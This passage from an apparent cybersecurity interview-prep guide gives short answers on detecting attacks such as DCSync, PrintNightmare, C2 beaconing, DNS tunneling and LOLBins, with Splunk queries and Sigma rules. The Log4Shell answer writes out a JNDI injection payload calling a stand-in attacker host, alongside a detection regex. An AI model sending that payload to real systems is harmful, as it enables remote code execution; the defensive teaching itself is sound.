**Difference from Golden:**
- More targeted (single service)
- Doesn't require KRBTGT hash
- Harder to detect (no DC logs)

**Detection:**
- Ticket without corresponding TGT request
- Service ticket encryption anomalies
- Event 4769 anomalies

---

## Q78: How do you analyze obfuscated PowerShell?
**Answer:**

**Techniques:**
1. **Script block logging**: Enable in GPO, logs decoded commands
2. **Manual deobfuscation**: Replace IEX with Write-Output
3. **PowerShell ISE**: Step through code
4. **Tools**: PSDecode, PowerDecode, Revoke-Obfuscation

**Common Obfuscation:**
- Base64 encoding
- Compressed streams
- String concatenation
- Variable substitution
- Invoke-Expression (IEX)

---

## Q79: How do you detect DCSync attack?
**Answer:**

**Attack:** Uses Directory Replication Service to extract password hashes from DC.

**Detection (Event ID 4662):**
- Object Type: domainDNS
- Access Mask: 0x100
- Properties containing replication GUIDs:
  - 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
  - 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

**Non-DC requesting replication = Suspicious**

---

## Q80: Explain DLL injection detection techniques.
**Answer:**

**Detection Methods:**
1. **Process memory analysis**: Unexpected DLLs
2. **API hooking detection**: Intercept LoadLibrary calls
3. **Volatility analysis**:
```bash
vol -f mem.dmp windows.dlllist --pid 1234
vol -f mem.dmp windows.ldrmodules
```

**Indicators:**
- DLLs loaded from unusual paths
- Unsigned DLLs in system processes
- DLLs not on disk
- Memory-only execution

---

## Q81: How would you detect LLMNR/NBT-NS poisoning?
**Answer:**

**Detection:**
1. **Network monitoring**: Unusual LLMNR/NBT-NS responses
2. **Honeypots**: Broadcast non-existent names
3. **Wireshark**:
```
llmnr or nbns
```

**Prevention:**
- Disable LLMNR (GPO)
- Disable NetBIOS over TCP/IP
- Network segmentation
- Strong credentials (resist cracking)

---

## Q82: Explain how to detect PrintNightmare exploitation.
**Answer:**

**CVE-2021-34527** - Windows Print Spooler vulnerability

**Detection:**
- Event ID 808 (PrintService)
- New DLL in System32\spool\drivers
- spoolsv.exe spawning cmd/PowerShell
- Suspicious DLL loads by spoolsv.exe

**Sigma Rule Concept:**
```yaml
detection:
    selection:
        ParentImage|endswith: '\spoolsv.exe'
        Image|endswith: 
            - '\cmd.exe'
            - '\powershell.exe'
    condition: selection
```

---

## Q83: How do you analyze JavaScript malware?
**Answer:**

**Techniques:**
1. **Beautify** obfuscated code
2. **Replace eval()** with console.log()
3. **Use sandbox** (Node.js in VM)
4. **Tools**: js-beautify, JStillery, de4js

**Common Patterns:**
- eval() chains
- String.fromCharCode()
- Encoded payloads
- DOM manipulation for C2

**Safe Analysis:**
```javascript
// Replace eval with print
var _eval = eval;
eval = function(x) { console.log(x); };
```

---

## Q84: What is a beacon and how do you detect C2 beaconing?
**Answer:**

**Beacon:** Regular check-in communication from compromised host to C2 server.

**Detection:**
- Regular interval patterns (even with jitter)
- Low-entropy data patterns
- Unusual destination ports
- DNS query patterns

**Analysis:**
```
# Network frequency analysis
tshark -r capture.pcap -T fields -e frame.time_delta -e ip.dst | sort | uniq -c

# Splunk
index=network 
| timechart span=1m count by dest_ip
| where count>50
```

---

## Q85: How do you investigate a phishing campaign?
**Answer:**

**Email Analysis:**
1. Header analysis (received headers, SPF/DKIM/DMARC)
2. Sender reputation
3. Link analysis (hover, not click)
4. Attachment analysis (sandbox)

**Infrastructure Mapping:**
```bash
# WHOIS
whois phishing-domain.com

# DNS history
dig +trace phishing-domain.com

# URLScan
# Submit to urlscan.io

# Virus Total
# Submit URL/file
```

**Tools:** PhishTool, GoPhish (for testing), VirusTotal

---

## Q86: Explain the log4shell (CVE-2021-44228) attack and detection.
**Answer:**

**Attack:**
JNDI injection via log message:
```
${jndi:ldap://attacker.com/exploit}
```

**Detection:**
- Search logs for `${jndi:`
- Outbound LDAP/RMI connections
- Unusual Java processes

**Regex:**
```regex
\$\{jndi:(ldap|rmi|dns|ldaps|iiop)://.*\}
```

**Prevention:**
- Update Log4j
- Set `log4j2.formatMsgNoLookups=true`
- Remove JndiLookup class

---

## Q87: How do you detect web shell activity?
**Answer:**

**Indicators:**
- New/modified files in web directories
- Unusual file extensions
- Files with eval(), exec(), system()
- Unusual HTTP POST to static paths
- High-entropy file content

**Detection:**
1. **File integrity monitoring**
2. **WAF rules** for common web shells
3. **YARA rules** for web shell signatures
4. **Log analysis**: POST to unexpected files

---

## Q88: Explain supply chain attack detection.
**Answer:**

**Types:**
- Compromised dependencies (SolarWinds)
- Typosquatting packages
- Compromised build systems

**Detection:**
- Software Bill of Materials (SBOM)
- Dependency scanning
- Build system monitoring
- Binary reproducibility checks
- Behavioral analysis of updates

**Tools:**
- Snyk, Dependabot (dependencies)
- Sigstore (artifact signing)
- SLSA (supply chain security framework)

---

## Q89: How do you perform threat hunting with Splunk?
**Answer:**

**Approach:**
1. **Hypothesis-driven**: "Attackers may use PowerShell for lateral movement"
2. **Build query**:
```
index=wineventlog sourcetype=WinEventLog:PowerShell
| search *Invoke-Command* OR *Enter-PSSession*
| table _time, host, ScriptBlockText
```
3. **Analyze results**
4. **Iterate and refine**

**Key Data Sources:**
- Windows Security logs
- Sysmon
- PowerShell logs
- Network flows
- EDR telemetry

---

## Q90: What is living off the land (LOLBins) and how to detect it?
**Answer:**

**LOLBins:** Using legitimate Windows binaries for malicious purposes.

**Common LOLBins:**
| Binary | Malicious Use |
|--------|---------------|
| certutil | Download files |
| mshta | Execute HTA |
| regsvr32 | Execute DLL |
| rundll32 | Execute DLL |
| wmic | Remote execution |
| powershell | Everything |

**Detection:**
- Command-line logging
- Parent-child relationships
- Unusual network connections from these binaries
- LOLBAS project (lolbas-project.github.io)

---

## Q91: How do you analyze Android malware?
**Answer:**

**Tools:**
- **APKTool**: Decompile APK
- **JADX**: Java decompiler
- **MobSF**: Automated analysis
- **Frida**: Dynamic instrumentation

**Process:**
1. Extract APK (`apktool d app.apk`)
2. Analyze AndroidManifest.xml
3. Decompile to Java (JADX)
4. Look for suspicious permissions
5. Analyze network calls
6. Dynamic analysis in emulator

---

## Q92: Explain DNS tunneling detection in depth.
**Answer:**

**Indicators:**
1. **High query volume** to single domain
2. **Long subdomain names** (encoded data)
3. **TXT record abuse**
4. **Low TTL values**
5. **High entropy** in query names

**Detection Query (Splunk):**
```
index=dns 
| eval subdomain_len=len(query)-len(domain)
| where subdomain_len > 50
| stats count by query, domain
```

**Tools:**
- dnstop
- passivedns
- DNScat2 (testing)

---

## Q93: How would you detect process injection?
**Answer:**

**Sysmon Events:**
- Event ID 8: CreateRemoteThread
- Event ID 10: ProcessAccess (PROCESS_VM_WRITE)

**Volatility:**
```bash
vol -f mem.dmp windows.malfind
```

**Indicators:**
- Memory regions with RWX permissions
- Unbacked executable memory
- Cross-process memory writes
- CreateRemoteThread calls

---

## Q94: Explain MITRE ATT&CK coverage analysis.
**Answer:**

**Process:**
1. Map existing detections to ATT&CK techniques
2. Identify coverage gaps
3. Prioritize based on threat intel
4. Build new detections
5. Test and validate

**Tools:**
- ATT&CK Navigator
- DeTT&CT
- Sigma rules mapped to ATT&CK

**Coverage Metrics:**
- Techniques covered / Total techniques
- Data sources available
- Detection confidence levels

---

## Q95: How do you detect data exfiltration?
**Answer:**

**Methods & Detection:**

| Method | Detection |
|--------|-----------|
| DNS | Long queries, high volume |
| HTTPS | Large outbound, SSL inspection |
| Email | DLP, attachment monitoring |
| USB | Endpoint logging |
| Cloud | CASB, API monitoring |

**Indicators:**
- Unusual upload volumes
- Off-hours transfers
- Compression/encryption before transfer
- New external destinations

---

## Q96: Explain OSINT automation for red teams.
**Answer:**

**Framework:**
1. **SpiderFoot**: Automated OSINT
2. **Recon-ng**: Modular framework
3. **theHarvester**: Email/domain intel
4. **Amass**: Subdomain enum

**Custom Automation:**
```python
# Example: Subdomain enumeration
import subprocess
targets = ['example.com']
for target in targets:
    subprocess.run(['amass', 'enum', '-d', target, '-o', f'{target}_subs.txt'])
    subprocess.run(['httpx', '-l', f'{target}_subs.txt', '-o', f'{target}_live.txt'])
```

---

## Q97: How do you build a detection lab?
**Answer:**

**Components:**
1. **Attack Machine**: Kali Linux
2. **Victim Machines**: Windows 10, Windows Server, Linux
3. **Monitoring**: Splunk/ELK, Sysmon, Zeek
4. **Network**: pfSense, isolated VLAN
5. **Automation**: Terraform, Ansible

**Resources:**
- Detection Lab (Chris Long)
- DVWA, VulnHub, HackTheBox
- Atomic Red Team (testing)

---

## Q98: Explain threat intelligence platforms and their use.
**Answer:**

**Platforms:**
- **MISP**: Open-source TIP
- **OpenCTI**: Structured threat intel
- **ThreatConnect**: Commercial
- **Anomali**: Commercial

**Use Cases:**
1. IOC aggregation
2. Threat actor tracking
3. Alert enrichment
4. Hunting hypotheses
5. Risk prioritization

**Integration:**
- SIEM enrichment
- Firewall/proxy blocking
- Automated triage

---

## Q99: How do you measure SOC effectiveness?
**Answer:**

**Key Metrics:**
| Metric | Description |
|--------|-------------|
| MTTD | Mean Time to Detect |
| MTTR | Mean Time to Respond |
| MTTC | Mean Time to Contain |
| False Positive Rate | Noise vs real alerts |
| Alert Volume | Total alerts handled |
| Escalation Rate | Alerts requiring escalation |

**Benchmarks:**
- MTTD: < 24 hours (ideally minutes)
- MTTR: < 4 hours
- False Positive Rate: < 50%

---

## Q100: Describe your approach to building custom detection rules.
**Answer:**

**Process:**
1. **Threat Intelligence**: Understand attacker TTPs
2. **Data Source Inventory**: What logs are available?
3. **Detection Logic**: Map TTP to observable
4. **Rule Development**: Write in Sigma/Splunk/etc.
5. **Testing**: Use Atomic Red Team
6. **Tuning**: Reduce false positives
7. **Documentation**: Alert playbook
8. **Maintenance**: Regular review

**Example Workflow:**
```
Threat: Mimikatz usage
Data: Sysmon Event ID 10
Logic: lsass.exe access with specific masks
Rule: 
    process_name=lsass.exe AND 
    called_from NOT IN whitelist
Test: Run Mimikatz in lab
Tune: Whitelist legitimate tools
```

---

# 📚 Quick Reference - Top 20 Tools Summary

| Tool | Primary Use |
|------|-------------|
| Nmap | Network scanning |
| Wireshark | Packet analysis |
| Burp Suite | Web security testing |
| Metasploit | Exploitation framework |
| SQLMap | SQL injection |
| Hashcat | Password cracking |
| John the Ripper | Password cracking |
| Hydra | Online brute force |
| Mimikatz | Windows credentials |
| Volatility | Memory forensics |
| Splunk | SIEM |
| Snort | IDS/IPS |
| Nessus | Vulnerability scanning |
| Ghidra | Reverse engineering |
| BloodHound | AD attack paths |
| Responder | LLMNR poisoning |
| Impacket | Windows protocols |
| CrackMapExec | AD post-exploitation |
| theHarvester | OSINT |
| Nuclei | Vulnerability scanning |

---

**Good luck with your TCS HackQuest interview!** 🚀
